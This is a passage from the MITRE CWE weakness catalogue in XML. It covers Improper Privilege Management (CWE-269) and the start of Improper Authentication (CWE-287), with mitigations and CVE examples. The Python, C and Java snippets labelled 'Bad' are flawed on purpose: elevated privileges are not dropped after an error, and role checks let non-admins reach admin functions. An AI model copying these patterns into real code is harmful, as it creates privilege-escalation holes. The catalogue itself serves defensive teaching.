					<ns0:Modification_Date>2023-04-27</ns0:Modification_Date>
					<ns0:Modification_Comment>updated References, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-06-29</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Mapping_Notes, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
            <ns0:Previous_Entry_Name Date="2009-01-12">Insufficient Input Validation</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Weakness>
      <ns0:Weakness ID="269" Name="Improper Privilege Management" Abstraction="Class" Structure="Simple" Status="Draft">
         <ns0:Description>The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor.</ns0:Description>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary" />
         </ns0:Related_Weaknesses>
         <ns0:Weakness_Ordinalities>
            <ns0:Weakness_Ordinality>
               <ns0:Ordinality>Primary</ns0:Ordinality>
            </ns0:Weakness_Ordinality>
         </ns0:Weakness_Ordinalities>
         <ns0:Applicable_Platforms>
            <ns0:Language Class="Not Language-Specific" Prevalence="Undetermined" />
         </ns0:Applicable_Platforms>
         <ns0:Modes_Of_Introduction>
            <ns0:Introduction>
               <ns0:Phase>Architecture and Design</ns0:Phase>
            </ns0:Introduction>
            <ns0:Introduction>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</ns0:Note>
            </ns0:Introduction>
            <ns0:Introduction>
               <ns0:Phase>Operation</ns0:Phase>
            </ns0:Introduction>
         </ns0:Modes_Of_Introduction>
         <ns0:Likelihood_Of_Exploit>Medium</ns0:Likelihood_Of_Exploit>
         <ns0:Common_Consequences>
            <ns0:Consequence>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Impact>Gain Privileges or Assume Identity</ns0:Impact>
            </ns0:Consequence>
         </ns0:Common_Consequences>
         <ns0:Detection_Methods>
           <ns0:Detection_Method Detection_Method_ID="DM-14">
             <ns0:Method>Automated Static Analysis</ns0:Method>
             <ns0:Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</ns0:Description>
             <ns0:Effectiveness>High</ns0:Effectiveness>
           </ns0:Detection_Method>
         </ns0:Detection_Methods>
         <ns0:Potential_Mitigations>
            <ns0:Mitigation Mitigation_ID="MIT-1">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Phase>Operation</ns0:Phase>
               <ns0:Description>Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-48">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Strategy>Separation of Privilege</ns0:Strategy>
               <ns0:Description>Follow the principle of least privilege when assigning access rights to entities in a software system.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-49">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Strategy>Separation of Privilege</ns0:Strategy>
               <ns0:Description>Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource.</ns0:Description>
            </ns0:Mitigation>
         </ns0:Potential_Mitigations>
         <ns0:Demonstrative_Examples>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-126">
               <ns0:Intro_Text>This code temporarily raises the program's privileges to allow creation of a new user folder.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Python">
                  <html:div>def makeNewUserDir(username):<html:div style="margin-left:1em;">
                        <html:div>if invalidUsername(username):<html:div style="margin-left:1em;">
                              <html:div>
                                 <html:br />
                                 <html:i>#avoid CWE-22 and CWE-78</html:i>
                                 <html:br />print('Usernames cannot contain invalid characters')<html:br />return False</html:div>
                           </html:div>
                           <html:br />try:<html:div style="margin-left:1em;">raisePrivileges()<html:br />os.mkdir('/home/' + username)<html:br />lowerPrivileges()</html:div>
                           <html:br />except OSError:<html:div style="margin-left:1em;">print('Unable to create new user directory for user:' + username)<html:br />return False</html:div>
                           <html:br />return True</html:div>
                     </html:div>
                  </html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>While the program only raises its privilege level to create the folder and immediately lowers it again, if the call to os.mkdir() throws an exception, the call to lowerPrivileges() will not occur. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-97">
               <ns0:Intro_Text>The following example demonstrates the weakness.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>seteuid(0);<html:br />
                     <html:i>/* do some stuff */</html:i>
                     <html:br />
                     <html:br />seteuid(getuid());</html:div>
               </ns0:Example_Code>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-142">
               <ns0:Intro_Text>The following example demonstrates the weakness.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Java">
                  <html:div>AccessController.doPrivileged(new PrivilegedAction() {<html:div style="margin-left:1em;">
                        <html:div>public Object run() {<html:div style="margin-left:1em;">
                                 <html:i>// privileged code goes here, for example:</html:i>
                                 <html:br />System.loadLibrary("awt");<html:br />return null;<html:br />
                                 <html:i>// nothing to return</html:i>
                                 <html:br />
                           </html:div>}</html:div>
                     </html:div>
                  </html:div>
               </ns0:Example_Code>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-127">
               <ns0:Intro_Text>This code intends to allow only Administrators to print debug information about a system.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Java">
                  <html:div>public enum Roles {<html:div style="margin-left:1em;">ADMIN,USER,GUEST</html:div>}<html:br />
                     <html:br />public void printDebugInfo(User requestingUser){<html:div style="margin-left:1em;">
                        <html:div>if(isAuthenticated(requestingUser)){<html:div style="margin-left:1em;">
                              <html:div>switch(requestingUser.role){<html:div style="margin-left:1em;">
                                    <html:div>case GUEST:<html:div style="margin-left:1em;">System.out.println("You are not authorized to perform this command");<html:br />break;</html:div>
                                       <html:br />default:<html:div style="margin-left:1em;">System.out.println(currentDebugState());<html:br />break;</html:div>
                                    </html:div>
                                 </html:div>}</html:div>
                           </html:div>}<html:br />else{<html:div style="margin-left:1em;">System.out.println("You must be logged in to perform this command");</html:div>}</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>While the intention was to only allow Administrators to print the debug information, the code as written only excludes those with the role of "GUEST". Someone with the role of "ADMIN" or "USER" will be allowed access, which goes against the original intent. An attacker may be able to use this debug information to craft an attack on the system.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-128">
               <ns0:Intro_Text>This code allows someone with the role of "ADMIN" or "OPERATOR" to reset a user's password. The role of "OPERATOR" is intended to have less privileges than an "ADMIN", but still be able to help users with small issues such as forgotten passwords.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Java">
                  <html:div>public enum Roles {<html:div style="margin-left:1em;">ADMIN,OPERATOR,USER,GUEST</html:div>}<html:br />
                     <html:br />public void resetPassword(User requestingUser, User user, String password ){<html:div style="margin-left:1em;">
                        <html:div>if(isAuthenticated(requestingUser)){<html:div style="margin-left:1em;">
                              <html:div>switch(requestingUser.role){<html:div style="margin-left:1em;">
                                    <html:div>case GUEST:<html:div style="margin-left:1em;">System.out.println("You are not authorized to perform this command");<html:br />break;</html:div>
                                       <html:br />case USER:<html:div style="margin-left:1em;">System.out.println("You are not authorized to perform this command");<html:br />break;</html:div>
                                       <html:br />default:<html:div style="margin-left:1em;">setPassword(user,password);<html:br />break;</html:div>}</html:div>
                                 </html:div>}</html:div>
                           </html:div>
                           <html:br />else{<html:div style="margin-left:1em;">System.out.println("You must be logged in to perform this command");</html:div>}</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>This code does not check the role of the user whose password is being reset. It is possible for an Operator to gain Admin privileges by resetting the password of an Admin account and taking control of that account.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
         </ns0:Demonstrative_Examples>
         <ns0:Observed_Examples>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2001-1555</ns0:Reference>
               <ns0:Description>Terminal privileges are not reset when a user logs out.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2001-1555</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2001-1514</ns0:Reference>
               <ns0:Description>Does not properly pass security context to child processes in certain cases, allows privilege escalation.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2001-1514</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2001-0128</ns0:Reference>
               <ns0:Description>Does not properly compute roles.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2001-0128</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-1999-1193</ns0:Reference>
               <ns0:Description>untrusted user placed in unix "wheel" group</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-1999-1193</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-2741</ns0:Reference>
               <ns0:Description>Product allows users to grant themselves certain rights that can be used to escalate privileges.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-2741</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-2496</ns0:Reference>
               <ns0:Description>Product uses group ID of a user instead of the group, causing it to run with different privileges. This is resultant from some other unknown issue.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-2496</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-0274</ns0:Reference>
               <ns0:Description>Product mistakenly assigns a particular status to an entity, leading to increased privileges.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-0274</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2007-4217</ns0:Reference>
               <ns0:Description>FTP client program on a certain OS runs with setuid privileges and has a buffer overflow. Most clients do not need extra privileges, so an overflow is not a vulnerability for those clients.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2007-4217</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2007-5159</ns0:Reference>
               <ns0:Description>OS incorrectly installs a program with setuid privileges, allowing users to gain privileges.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2007-5159</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-4638</ns0:Reference>
               <ns0:Description>Composite: application running with high privileges (CWE-250) allows user to specify a restricted file to process, which generates a parsing error that leaks the contents of the file (CWE-209).</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-4638</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2007-3931</ns0:Reference>
               <ns0:Description>Installation script installs some programs as setuid when they shouldn't be.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2007-3931</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-1981</ns0:Reference>
               <ns0:Description>Roles have access to dangerous procedures (Accessible entities).</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-1981</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-1671</ns0:Reference>
               <ns0:Description>Untrusted object/method gets access to clipboard (Accessible entities).</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-1671</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2000-0315</ns0:Reference>
               <ns0:Description>Traceroute program allows unprivileged users to modify source address of packet (Accessible entities).</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2000-0315</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2000-0506</ns0:Reference>
               <ns0:Description>User with capability can prevent setuid program from dropping privileges (Unsafe privileged actions).</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2000-0506</ns0:Link>
            </ns0:Observed_Example>
         </ns0:Observed_Examples>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <ns0:Entry_Name>Privilege Management Error</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
			<ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <ns0:Entry_ID>Part 2-4</ns0:Entry_ID>
			  <ns0:Entry_Name>Req SP.03.08 BR</ns0:Entry_Name>
			</ns0:Taxonomy_Mapping>
			<ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <ns0:Entry_ID>Part 3-2</ns0:Entry_ID>
			  <ns0:Entry_Name>Req CR 3.1</ns0:Entry_Name>
			</ns0:Taxonomy_Mapping>
			<ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <ns0:Entry_ID>Part 3-3</ns0:Entry_ID>
			  <ns0:Entry_Name>Req SR 1.2</ns0:Entry_Name>
			</ns0:Taxonomy_Mapping>
			<ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <ns0:Entry_ID>Part 3-3</ns0:Entry_ID>
			  <ns0:Entry_Name>Req SR 2.1</ns0:Entry_Name>
			</ns0:Taxonomy_Mapping>
			<ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <ns0:Entry_ID>Part 4-1</ns0:Entry_ID>
			  <ns0:Entry_Name>Req SD-3</ns0:Entry_Name>
			</ns0:Taxonomy_Mapping>
			<ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <ns0:Entry_ID>Part 4-1</ns0:Entry_ID>
			  <ns0:Entry_Name>Req SD-4</ns0:Entry_Name>
			</ns0:Taxonomy_Mapping>
			<ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <ns0:Entry_ID>Part 4-1</ns0:Entry_ID>
			  <ns0:Entry_Name>Req SI-1</ns0:Entry_Name>
			</ns0:Taxonomy_Mapping>
			<ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <ns0:Entry_ID>Part 4-2</ns0:Entry_ID>
			  <ns0:Entry_Name>Req CR 1.1</ns0:Entry_Name>
			</ns0:Taxonomy_Mapping>
			<ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <ns0:Entry_ID>Part 4-2</ns0:Entry_ID>
			  <ns0:Entry_Name>Req CR 2.1</ns0:Entry_Name>
			</ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern CAPEC_ID="122" />
            <ns0:Related_Attack_Pattern CAPEC_ID="233" />
            <ns0:Related_Attack_Pattern CAPEC_ID="58" />
         </ns0:Related_Attack_Patterns>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-44" Section="&quot;Sin 16: Executing Code With Too Much Privilege.&quot; Page 243" />
            <ns0:Reference External_Reference_ID="REF-62" Section="Chapter 9, &quot;Dropping Privileges Permanently&quot;, Page 479" />
            <ns0:Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings" />
         </ns0:References>
         <ns0:Mapping_Notes>
            <ns0:Usage>Discouraged</ns0:Usage>
            <ns0:Rationale>CWE-269 is commonly misused. It can be conflated with "privilege escalation," which is a technical impact that is listed in many low-information vulnerability reports [REF-1287]. It is not useful for trend analysis.</ns0:Rationale>
            <ns0:Comments>If an error or mistake allows privilege escalation, then use the CWE ID for that mistake. Avoid using CWE-269 when only phrases such as "privilege escalation" or "gain privileges" are available, as these indicate technical impact of the vulnerability - not the root cause weakness. If the root cause seems to be directly related to privileges, then examine the children of CWE-269 for additional hints, such as Execution with Unnecessary Privileges (CWE-250) or Incorrect Privilege Assignment (CWE-266).</ns0:Comments>
            <ns0:Reasons>
               <ns0:Reason Type="Frequent Misuse" />
            </ns0:Reasons>
         </ns0:Mapping_Notes>
         <ns0:Notes>
            <ns0:Note Type="Maintenance">The relationships between privileges, permissions, and actors (e.g. users and groups) need further refinement within the Research view. One complication is that these concepts apply to two different pillars, related to control of resources (CWE-664) and protection mechanism failures (CWE-693).</ns0:Note>
         </ns0:Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>PLOVER</ns0:Submission_Name>
               <ns0:Submission_Date>2006-07-19</ns0:Submission_Date>
               <ns0:Submission_Version>Draft 3</ns0:Submission_Version>
               <ns0:Submission_ReleaseDate>2006-07-19</ns0:Submission_ReleaseDate>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>Eric Dalci</ns0:Modification_Name>
               <ns0:Modification_Organization>Cigital</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-07-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Time_of_Introduction</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Organization>CWE Team</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-09-08</ns0:Modification_Date>
               <ns0:Modification_Comment>Moved this entry higher up in the Research view.</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-09-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Description, Maintenance_Notes, Name, Relationships, Taxonomy_Mappings, Weakness_Ordinalities</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-05-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Name</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-12-28</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-06-21</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-03-29</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Description, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-05-11</ns0:Modification_Date>
               <ns0:Modification_Comment>updated References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-10-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2013-02-21</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-11-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships, Type</ns0:Modification_Comment>
            </ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-06-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-09-19</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Demonstrative_Examples, Maintenance_Notes, Observed_Examples, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-02-24</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-08-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-03-15</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Demonstrative_Examples</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-10-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-04-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-10-13</ns0:Modification_Date>
					<ns0:Modification_Comment>updated References</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-01-31</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Description</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-04-27</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Detection_Factors, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-06-29</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Mapping_Notes, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Contribution Type="Content">
				  <ns0:Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</ns0:Contribution_Name>
				  <ns0:Contribution_Organization>CWE-CAPEC ICS/OT SIG</ns0:Contribution_Organization>
				  <ns0:Contribution_Date>2023-06-29</ns0:Contribution_Date>
				  <ns0:Contribution_Version>4.12</ns0:Contribution_Version>
				  <ns0:Contribution_ReleaseDate>2023-06-29</ns0:Contribution_ReleaseDate>
				  <ns0:Contribution_Comment>Suggested mappings to ISA/IEC 62443.</ns0:Contribution_Comment>
				</ns0:Contribution>
            <ns0:Previous_Entry_Name Date="2008-09-09">Privilege Management Error</ns0:Previous_Entry_Name>
            <ns0:Previous_Entry_Name Date="2009-05-27">Insecure Privilege Management</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Weakness>
      <ns0:Weakness ID="287" Name="Improper Authentication" Abstraction="Class" Structure="Simple" Status="Draft">
         <ns0:Description>When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct.</ns0:Description>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary" />
			<ns0:Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1340" Ordinal="Primary" />
         </ns0:Related_Weaknesses>
         <ns0:Applicable_Platforms>
            <ns0:Language Class="Not Language-Specific" Prevalence="Undetermined" />
            <ns0:Technology Class="ICS/OT" Prevalence="Often" />
         </ns0:Applicable_Platforms>
         <ns0:Alternate_Terms>
            <ns0:Alternate_Term>
               <ns0:Term>authentification</ns0:Term>
               <ns0:Description>An alternate term is "authentification", which appears to be most commonly used by people from non-English-speaking countries.</ns0:Description>
            </ns0:Alternate_Term>
            <ns0:Alternate_Term>
               <ns0:Term>AuthN</ns0:Term>
               <ns0:Description>"AuthN" is typically used as an abbreviation of "authentication" within the web application security community. It is also distinct from "AuthZ," which is an abbreviation of "authorization." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</ns0:Description>
            </ns0:Alternate_Term>
            <ns0:Alternate_Term>
               <ns0:Term>AuthC</ns0:Term>
               <ns0:Description>"AuthC" is used as an abbreviation of "authentication," but it appears to used less frequently than "AuthN."</ns0:Description>
            </ns0:Alternate_Term>
         </ns0:Alternate_Terms>
         <ns0:Modes_Of_Introduction>
            <ns0:Introduction>
               <ns0:Phase>Architecture and Design</ns0:Phase>
            </ns0:Introduction>
            <ns0:Introduction>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</ns0:Note>
            </ns0:Introduction>
         </ns0:Modes_Of_Introduction>
         <ns0:Likelihood_Of_Exploit>High</ns0:Likelihood_Of_Exploit>
         <ns0:Common_Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Impact>Read Application Data</ns0:Impact>
               <ns0:Impact>Gain Privileges or Assume Identity</ns0:Impact>
               <ns0:Impact>Execute Unauthorized Code or Commands</ns0:Impact>
               <ns0:Note>This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code.</ns0:Note>
            </ns0:Consequence>
         </ns0:Common_Consequences>
         <ns0:Detection_Methods>
            <ns0:Detection_Method Detection_Method_ID="DM-6">
               <ns0:Method>Automated Static Analysis</ns0:Method>
               <ns0:Description>
                  <html:p>Automated static analysis is useful for detecting certain types of authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries.</html:p>
                  <html:p>Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.</html:p>
               </ns0:Description>
               <ns0:Effectiveness>Limited</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method Detection_Method_ID="DM-7">
               <ns0:Method>Manual Static Analysis</ns0:Method>
               <ns0:Description>
                  <html:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</html:p>
                  <html:p>Manual static analysis is useful for evaluating the correctness of custom authentication mechanisms.</html:p>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
               <ns0:Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</ns0:Effectiveness_Notes>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Manual Static Analysis - Binary or Bytecode</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
